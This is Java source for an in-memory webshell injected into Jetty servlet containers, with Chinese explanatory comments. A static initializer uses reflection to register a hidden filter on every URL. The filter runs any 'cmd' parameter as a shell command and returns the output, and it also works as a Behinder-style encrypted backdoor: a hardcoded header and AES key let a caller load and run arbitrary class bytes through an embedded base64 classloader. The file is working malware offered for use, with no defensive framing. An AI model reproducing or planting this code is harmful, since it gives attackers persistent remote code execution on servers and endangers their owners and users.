package Inject;

import org.eclipse.jetty.servlet.FilterMapping;

import javax.crypto.Cipher;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings("all")
public class JettyInjectFilterShell implements Filter {

    Object request = null;
    Object response = null;
    boolean bool = false;
    String filterName = "JettyFilter";
    String urlPattern = "/*";

    private String behinderShellHeader = "D0g3";

    private String behinderShellPwd = "b9ecd0aebe82a741"; // Crilwa

    static  {
        JettyInjectFilterShell shell = new JettyInjectFilterShell();
        try {
            shell.init();
            Object _scope = JettyInjectFilterShell.getField(shell.request,"_scope");
            // 获取 ServletHandler 对象
            Object _servletHandler = JettyInjectFilterShell.getField(_scope,"_servletHandler");

            Object[] _filters = (Object[]) JettyInjectFilterShell.getField(_servletHandler,"_filters");
            // 判断 filter 是否已注入，如果已注入就不继续运行代码
            for (Object filter:_filters){
                String _name = (String) JettyInjectFilterShell.getField(filter,"_name");
                if (_name.equals(shell.filterName)){
                    shell.bool = true;
                    break;
                }
            }

            if (!shell.bool){
                // 反射获取 FilterHolder 构造器并进行实例化
                Class filterHolderClas = _filters[0].getClass();
                Constructor filterHolderCons = filterHolderClas.getConstructor(javax.servlet.Filter.class);
                Object filterHolder = filterHolderCons.newInstance(shell);

                // 反射获取 FilterMapping 构造器并进行实例化
                Object[] _filtersMappings = (Object[]) JettyInjectFilterShell.getField(_servletHandler,"_filterMappings");
                Class filterMappingClas = _filtersMappings[0].getClass();
                Constructor filterMappingCons = filterMappingClas.getConstructor();
                Object filterMapping = filterMappingCons.newInstance();

                // 反射赋值 filter 名
                Field _filterNameField = filterMappingClas.getDeclaredField("_filterName");
                _filterNameField.setAccessible(true);
                try {
                    _filterNameField.set(filterMapping, shell.filterName);
                }catch (Exception e){
                    FilterMapping filterMapping1 = new FilterMapping();
                    filterMapping1.setFilterName(shell.filterName);
                    _filterNameField.set(filterMapping1,shell.filterName);
                }

                // 反射赋值 _holder
                Field _holderField = filterMappingClas.getDeclaredField("_holder");
                _holderField.setAccessible(true);
                _holderField.set(filterMapping,filterHolder);

                // 反射赋值 urlpattern
                Field _pathSpecsField = filterMappingClas.getDeclaredField("_pathSpecs");
                _pathSpecsField.setAccessible(true);
                _pathSpecsField.set(filterMapping,new String[]{shell.urlPattern});

                /**
                 * private final Map<String, FilterHolder> _filterNameMap = new HashMap();
                 *
                 *  at org.eclipse.jetty.servlet.ServletHandler.updateMappings(ServletHandler.java:1345)
                 *  at org.eclipse.jetty.servlet.ServletHandler.setFilterMappings(ServletHandler.java:1542)
                 *  at org.eclipse.jetty.servlet.ServletHandler.prependFilterMapping(ServletHandler.java:1242)
                 */

                // 属性带有 final 需要先反射修改 modifiers 才能编辑 final 变量
                Field _filterNameMapField = _servletHandler.getClass().getDeclaredField("_filterNameMap");
                _filterNameMapField.setAccessible(true);
                Field modifiersField = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(_filterNameMapField,_filterNameMapField.getModifiers()& ~Modifier.FINAL);
                // 先把原来的取出来然后再放进去
                Map _filterNameMap = (Map) _filterNameMapField.get(_servletHandler);
                _filterNameMap.put(shell.filterName, filterHolder);
                _filterNameMapField.set(_servletHandler,_filterNameMap);
                // 调用 prependFilterMapping 将 mapping 放到第一个
                Method prependFilterMappingMethod = _servletHandler.getClass().getDeclaredMethod("prependFilterMapping",filterMappingClas);
                prependFilterMappingMethod.setAccessible(true);
                prependFilterMappingMethod.invoke(_servletHandler,filterMapping);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void init() throws Exception{
        Class<?> clazz = Thread.currentThread().getClass();
        Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object object = field.get(Thread.currentThread());
        field = object.getClass().getDeclaredField("table");
        field.setAccessible(true);
        object = field.get(object);
        Object[] arrayOfObject = (Object[])object;
        for (byte b = 0; b < arrayOfObject.length; b++) {
            Object object1 = arrayOfObject[b];
            if (object1 != null) {
                field = object1.getClass().getDeclaredField("value");
                field.setAccessible(true);
                object = field.get(object1);
                if (object != null && object.getClass().getName().endsWith("HttpConnection")) {
                    Method method = object.getClass().getDeclaredMethod("getHttpChannel", null);
                    Object object2 = method.invoke(object, null);
                    method = object2.getClass().getMethod("getRequest", null);
                    this.request =  method.invoke(object2, null);
                    method = this.request.getClass().getMethod("getResponse", null);
                    this.response =  method.invoke(this.request, null);
                    break;
                }
            }
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        String cmd = servletRequest.getParameter("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String[] cmds = null;
            if(File.separator.equals("/")){
                cmds = new String[]{"/bin/sh", "-c", cmd};
            }else{
                cmds = new String[]{"cmd", "/C", cmd};
            }

            Process process = Runtime.getRuntime().exec(cmds);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }else if(((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null&&(((HttpServletRequest)servletRequest).getMethod().equals("POST"))){
            //behind4 shell
            try{
                String k = behinderShellPwd;
                HttpSession session = ((HttpServletRequest)servletRequest).getSession();
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));

                HashMap map = new HashMap();
                map.put("request", servletRequest);
                map.put("response", servletResponse);
                map.put("session", session);

                //取classloader
                byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
                ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try{
                    uclass = cl.loadClass("U");
                }catch(ClassNotFoundException e){
                    uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
                }

                Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g",byte[].class);
                Um.setAccessible(true);

                //冰蝎payload
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
                Class evilclass = (Class) Um.invoke(u,evilClassBytes);
                Object a = evilclass.newInstance();
                Method b = evilclass.getDeclaredMethod("equals",Object.class);
                b.setAccessible(true);
                b.invoke(a, map);
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
    }

    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }
}

